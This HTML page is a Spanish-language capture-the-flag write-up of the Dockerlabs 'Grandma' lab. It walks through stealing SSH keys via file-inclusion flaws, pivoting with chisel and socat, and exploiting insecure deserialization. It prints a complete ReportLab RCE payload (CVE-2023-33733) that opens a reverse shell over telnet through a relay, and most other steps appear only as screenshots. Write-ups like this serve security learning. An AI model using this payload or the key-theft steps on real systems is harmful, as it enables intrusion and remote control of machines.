<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Grandma - Dockerlabs - briancgx.io</title>
<meta name="description" content="Grandma es una máquina clasificada como ‘Difícil’ en la plataforma Dockerlabs, donde se practica intensamente el pivoting y el uso de herramientas como socat y chisel.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="briancgx.io">
<meta property="og:title" content="Grandma - Dockerlabs">
<meta property="og:url" content="http://localhost:4000/dockerlabs-writeup-grandma/">


  <meta property="og:description" content="Grandma es una máquina clasificada como ‘Difícil’ en la plataforma Dockerlabs, donde se practica intensamente el pivoting y el uso de herramientas como socat y chisel.">



  <meta property="og:image" content="http://localhost:4000/assets/images/dockerlabs-grandma/grandma-logo.png">





  <meta property="article:published_time" content="2024-08-17T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/dockerlabs-writeup-grandma/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "briancgx",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="briancgx.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Grandma - Dockerlabs</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/ig.jpg" alt="briancgx" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">briancgx</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, CTF player<br>HackTheBox CyberGh0st Team
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">México</span>
        </li>
      

      

      

      
        <li>
          <a href="mailto:brian.azael02@gmail.com">
            <meta itemprop="email" content="brian.azael02@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/briancgx" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      
        <li>
          <a href="https://instagram.com/briancgx" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://github.com/briancgx" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Grandma - Dockerlabs">
    <meta itemprop="description" content="Grandma es una máquina clasificada como ‘Difícil’ en la plataforma Dockerlabs, donde se practica intensamente el pivoting y el uso de herramientas como socat y chisel.">
    <meta itemprop="datePublished" content="August 17, 2024">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Grandma - Dockerlabs
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-08-17T00:00:00-06:00">August 17, 2024 </time>&emsp;
          
          
        </p>
        <p>Comenzamos desplegando el laboratorio Grandma, podemos ver que todas maquinas y sus direcciones IP, en algunos casos tienen dos, ya que en este laboratorio practicaremos pivoting y tunneling.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-1.png" alt="" /></p>

<h2 id="portscan-grandma1">Portscan Grandma1</h2>
<p>Realizamos los escaneos necesarios, el primero siempre será para determinar los puertos y en el segundo para sacar un poco más de información sobre versiones y más.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-2.png" alt="" /></p>

<p>En el segundo escaneo podemos darnos cuenta que el puerto 80 nos redirige a grandma.dl, podemos añadirlo a <code class="language-plaintext highlighter-rouge">/etc/hosts</code> pero otra cosa interesante es que por el puerto 5000 también tenemos otro servicio web que se ve interesante</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-3.png" alt="" /></p>

<h2 id="analizando-los-puertos-grandma1">Analizando los puertos Grandma1</h2>
<p>Primero accedimos al puerto 80, pero no alcancé a encontrar nada interesante, probé hacer fuzzing pero tampoco conseguí infomación que pudiera ser muy relevante, unicamente posibles usuarios ‘Dr Mario’ y ‘Dr Zunder’</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-5.png" alt="" /></p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-4.png" alt="" /></p>

<p>Despues nos fuimos al puerto 5000, investigamos la version de aiohttp, la cual era la 3.9.1 y encontré un <a href="https://github.com/ox1111/CVE-2024-23334">CVE-2024-23334</a> sobre LFI en el static.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-6.png" alt="" /></p>

<h2 id="intrusión-a-grandma1">Intrusión a Grandma1</h2>
<p>Capturamos la petición en burp y probamos el LFI apuntando al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y efectivamente drzunder era un usuario del sistema.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-7.png" alt="" /></p>

<p>Ahora que sabemos que drzunder existe en el sistema podemos probar el buscar y robar su <code class="language-plaintext highlighter-rouge">id_rsa</code>, afortunadamente lo conseguimos y podemos intentar logearnos por el puerto 22.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-8.png" alt="" /></p>

<p>Le damos los permisos necesarios y obtenemos el acceso, ahi tenemos la primera flag.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-9.png" alt="" /></p>

<h2 id="pivoting-grandma1">Pivoting Grandma1</h2>
<p>En este laboratorio no podemos escalar privilegios, por lo que va sobre pivoting, asi que primero nos compartiremos socat y chisel a la maquina ya vulnerada <strong>Grandma1</strong>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-10.png" alt="" /></p>

<p>Luego usamos chisel para crear un tunel y redirigir el trafico a nuestra maquina, para poder ver <strong>Grandma2</strong>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-11.png" alt="" /></p>

<p>Abriremos <code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code> con <code class="language-plaintext highlighter-rouge">nano</code> y añadimos <code class="language-plaintext highlighter-rouge">socks5 127.0.0.1 1080</code> al final del archivo, ya que es el puerto por el cual se creo el tunel</p>

<h2 id="portscan-grandma2">Portscan Grandma2</h2>
<p>Como observamos al levantar el laboratorio, la ip de Grandma2 es 20.20.20.3, asi que usando proxychains antes del nmap podemos hacer un escaneo rapido, notamos que hay 2 puertos abiertos, a veces el 2222 es usado para el servicio <code class="language-plaintext highlighter-rouge">ssh</code>, asi que intentaré hacer <code class="language-plaintext highlighter-rouge">whatweb</code> al puerto 9000, para saber si este cuenta con servicio web.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-12.png" alt="" /></p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-13.png" alt="" /></p>

<p>Como era de suponer, por ahi corre un servicio web, asi que accedamos a la web para entenderlo mejor.</p>

<h2 id="analizando-servicio-web-grandma2">Analizando servicio web Grandma2</h2>
<p>Para acceder correctamente al sitio web, necesitamos configurar un nuevo proxy en la extension de burp, especificando el puerto del tunel, la ip localhost y del tipo SOCKS5.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-14.png" alt="" /></p>

<p>Una vez dentro encontré esta subida de archivos, pero unicamente recibe archivos con la extension .html y nos convierte a pdf, asi que nos toca capturar la peticion con burp y ver que esta sucediendo por detras</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-15.png" alt="" /></p>

<p>Pero para capturar la peticion debemos moficar un par de cosas en <strong>Proxy Settings</strong> de <strong>BurpSuite</strong>, en el apartado <strong>Network</strong> seguido de <strong>Connections</strong>, nos desplazamos hasta abajo <strong>SOCKS proxy</strong> y especificamos el puerto del tunel de nuevo y la ip, justo como en el navegador.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-16.png" alt="" /></p>

<p>De nuevo nos cambiamos a nuestro proxy de burp normal en el navegador y capturamos la peticion.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-17.png" alt="" /></p>

<p>Lo más destacable de la petición es que genera el reporte desde http://reportlab.com</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-18.png" alt="" /></p>

<h2 id="intrusión-a-grandma2">Intrusión a Grandma2</h2>
<p>Me encontré con el <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a> que habla de un RCE en reportlab, asi que lo probamos moficando ligeramente el codigo para obtener una reverse shell, pero antes de enviar el payload debemos configurar socat en <strong>Grandma1</strong>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-19.png" alt="" /></p>

<p>Tenemos configurado socat para que toda conexion que reciba por el puerto 1111 sea redirigida hacia el puerto 1234 de la ip 10.10.10.1, que en este caso es mi maquina atacante, donde estoy en escucha por ese puerto, esperando la revshell</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-20.png" alt="" /> #—</p>

<p>Ahora hacemos el envio del payload con la reverse por <strong>telnet</strong>, especificando la ip que tiene conectividad con <strong>Grandma 2</strong> (20.20.20.2) y el puerto 1111 que habiamos puesto en escucha con socat, solo queda esperar la reverse.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;para&gt;</span>
    <span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"[ [ getattr(pow,Attacker('__globals__'))['os'].system('TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 20.20.20.2 1111 0&lt;$TF | bash 1&gt;$TF') for Attacker in [orgTypeFun('
Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self:
{setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'"</span><span class="nt">&gt;</span>
    exploit
    <span class="nt">&lt;/font&gt;</span>
<span class="nt">&lt;/para&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-grandma/grandma-21.png" alt="" /></p>

<p>Una vez con la conexion recibida, exploramos un poco y como sabemos que las conexiones por netcat a veces no son tan estables buscamos de nuevo un <code class="language-plaintext highlighter-rouge">id_rsa</code> que nos de la posibilidad de acceder de manera sencilla, leemos el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> y exploramos el usuario app, ahi lo encontramos, basta con copiarlo y pegarlo dentro de <strong>Grandma1</strong> para acceder de manera más simple y segura.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-22.png" alt="" /></p>

<p>Una vez con los permisos necesarios entablamos la conexion por ssh especificando el puerto 2222 que anteriormente encontramos y como se esperaba, pudimos acceder sin ningun problema a Grandma2 como usuario app.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-23.png" alt="" /></p>

<h2 id="pivoting-grandma2">Pivoting Grandma2</h2>
<p>Ahora harémos el siguiente tunnel con <code class="language-plaintext highlighter-rouge">chisel</code> para poder ver <strong>Grandma3</strong> desde la maquina atacante, necesitamos pasar <code class="language-plaintext highlighter-rouge">chisel</code> y <code class="language-plaintext highlighter-rouge">socat</code>  a <strong>Grandma2</strong>, luego ejecutar <strong>chisel</strong>. Pondremos <strong>Grandma1</strong> redirigiendo por <code class="language-plaintext highlighter-rouge">socat</code>, esperando conexion por el puerto 111 y mandandola al puerto 33 de la atacante donde tenemos <code class="language-plaintext highlighter-rouge">chisel</code> en escucha.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-24.png" alt="" /></p>

<p>Desde <strong>Grandma2</strong> tiramos <code class="language-plaintext highlighter-rouge">chisel</code> para crear un tunnel con <strong>Grandma1</strong> que anteriormente pusimos en escucha con <code class="language-plaintext highlighter-rouge">socat</code> por el puerto 111 y le daremos el puerto 7777 que debemos añadir a nuestro proxychains4.conf en la atacante.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-25.png" alt="" /></p>

<p>Deberíamos recibir la conexión de la siguiente manera, desde el localhost por el puerto 7777.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-26.png" alt="" /></p>

<p>Como se menciono anteriormente, debemos añadir el localhost y el puerto de chisel al <code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code>, pero es sumamente importante ese orden y que dynamic_chain este descomentado pero random_chain comentado, como se muestra en la imagen.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-27.png" alt="" /></p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-28.png" alt="" /></p>

<h2 id="portscan-grandma3">Portscan Grandma3</h2>
<p>De igual manera al escaneo de <strong>Grandma2</strong>, aqui obtenemos dos puertos, el 2222 y ahora el 3000, asi que como lo hice anteriormente, ejecuto <code class="language-plaintext highlighter-rouge">whatweb</code> para saber si corre web y podemos ver que si.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-29.png" alt="" /></p>

<p>Configuramos de nuevo <strong>FoxyProxy</strong> pero ahora con el puerto 7777, y entramos a la web.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-30.png" alt="" /></p>

<h2 id="analizando-la-web-grandma3">Analizando la web Grandma3</h2>
<p>Nos encontramos con una pagina completamente en blanco que al inspeccionarla tampoco encontramos nada, asi que capturamos con burp la peticion para entender que pasa por detrás.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-31.png" alt="" /></p>

<p>De la misma manera que modificamos el SOCKS proxy para capturar la peticion de <strong>Grandma2</strong>, lo hacemos con el puerto 7777 para <strong>Grandma3</strong>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-32.png" alt="" /></p>

<p>A primera vista, parece que de igual manera, la pagina no tiene sentido ya que no aparece absolutamente nada, sin embargo estuve capturando un par de peticiones más y noté que la Cookie es distinta siempre, además que parece estar encodeada.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-33.png" alt="" /></p>

<p>Esta es otra peticion en la que se muestra otra cookie pero parece estar igual encodeada.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-34.png" alt="" /></p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-35.png" alt="" /></p>

<p>Al parecer es un base64, asi que estuve intentando codificar varios comandos a base64 y poniendolos en la cookie a ver si algo cambiaba.</p>

<h2 id="intrusión-a-grandma3">Intrusión a Grandma3</h2>
<p>Usando el decoder de burp intente hacer un LFI desde la cookie, tratando de leer el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, primero codificamos la ruta a base64</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-36.png" alt="" /></p>

<p>Solo me hizo falta modificar la cookie por el encodeado y el contenido se pudo mostrar, asi que intentaré ver los usuarios de <strong>Grandma3</strong>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-37.png" alt="" /></p>

<p>De la misma forma que antes, pero apuntando al <code class="language-plaintext highlighter-rouge">/etc/passwd</code> logramos mirar <code class="language-plaintext highlighter-rouge">node</code> como usuario del sistema.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-38.png" alt="" /></p>

<p>Como hemos estado haciendo hasta ahora, intenté apuntar al <code class="language-plaintext highlighter-rouge">id_rsa</code> de este usuario en <code class="language-plaintext highlighter-rouge">../../../../../home/node/.ssh/id_rsa</code>, y desde el puerto 2222 logramos acceder por ssh, justo como se ve en la imagen.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-39.png" alt="" /></p>

<h2 id="pivoting-grandma3">Pivoting Grandma3</h2>
<p>Ahora debemos crear el tunnel para poder ver <strong>Grandma3</strong> desde la maquina atacante, siguiendo la misma logica, usamos <code class="language-plaintext highlighter-rouge">socat</code> en <strong>Grandma2</strong> y <code class="language-plaintext highlighter-rouge">chisel</code> en <strong>Grandma3</strong>, es <strong>IMPORTANTE</strong> no cerrar ninguna de las conexiones anteriores que hicimos con <code class="language-plaintext highlighter-rouge">socat</code> o <code class="language-plaintext highlighter-rouge">chisel</code>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-40.png" alt="" /></p>

<p>Por ultimo solo nos queda esperar la conexión</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-41.png" alt="" /></p>

<p>Añadimos ahora el puerto 6666 al <code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code> en este orden, que siempre será importante llevar</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-42.png" alt="" /></p>

<h2 id="portscan-grandma4">Portscan Grandma4</h2>
<p>Ahora al hacer el escanneo de Grandma4 solo encontramos un puerto, el 9999, revisamos con <code class="language-plaintext highlighter-rouge">whatweb</code> a ver si podemos sacar algo de ahí y vemos el error 405, asi que entramos a la web para entender un poco mejor esto.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-43.png" alt="" /></p>

<p>Es siempre importante modificar el <strong>FoxyProxy</strong> para no tener problemas al momento de acceder.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-44.png" alt="" /></p>

<h2 id="analisis-grandma4">Analisis Grandma4</h2>
<p>Encontramos que unicamente esta disponible el método <strong>POST</strong>, asi que podemos probar realizar la misma peticion con <code class="language-plaintext highlighter-rouge">curl</code></p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-45.png" alt="" /></p>

<p>Al hacer la peticion, se nos listan varios usuarios, con sus <strong>id</strong> y <strong>nombre</strong>, sin embargo en el que parece ser el ultimo hay un <strong>“Command error”</strong>, podriamos aprovecharnos de esto.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-46.png" alt="" /></p>

<h2 id="intrusión-a-grandma4">Intrusión a Grandma4</h2>
<p>Notamos que la web esta deserializando el contenido <strong>JSON</strong> de manera insegura, lo que permite ejecutar comandos del sistema operativo a través de un código <strong>JavaScript</strong> inyectado, como el <code class="language-plaintext highlighter-rouge">whoami</code>.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-47.png" alt="" /></p>

<p>Asi que procedemos a intentar una revshell, la logica es ponernos con socat en escucha dentro de <strong>Grandma1</strong>, <strong>Grandma2</strong> y <strong>Grandma3</strong>, al mismo tiempo que esperamos con <code class="language-plaintext highlighter-rouge">nc</code> en la maquina atacante y enviar el payload , justo como se ve en la imagen.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-48.png" alt="" /></p>

<p>Si todo salió bien, debemos obtener la shell sin problema.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-49.png" alt="" /></p>

<p>Al recibir la shell noté que ya tenía acceso como <code class="language-plaintext highlighter-rouge">root</code>, por tanto solo accedemos a su directorio y leemos la flag.</p>

<p><img src="/assets/images/dockerlabs-grandma/grandma-50.png" alt="" /></p>

<h2 id="conclusiones">Conclusiones</h2>
<p>Esto es todo por el momento, la maquina Grandma creada por Pylon, me parecio muy interesante y entretenida ya que pude practicar el pivoting y recordar un poco el uso de herramientas como socat y chisel, me gustó mucho y vamos por más!</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#hard" class="page__taxonomy-item" rel="tag">hard</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">LFI</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pivoting" class="page__taxonomy-item" rel="tag">pivoting</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tunneling" class="page__taxonomy-item" rel="tag">tunneling</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#dockerlabs" class="page__taxonomy-item" rel="tag">dockerlabs</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-08-17T00:00:00-06:00">August 17, 2024</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/dockerlabs-writeup-trust/" class="pagination--pager" title="Trust - Dockerlabs
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 briancgx</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
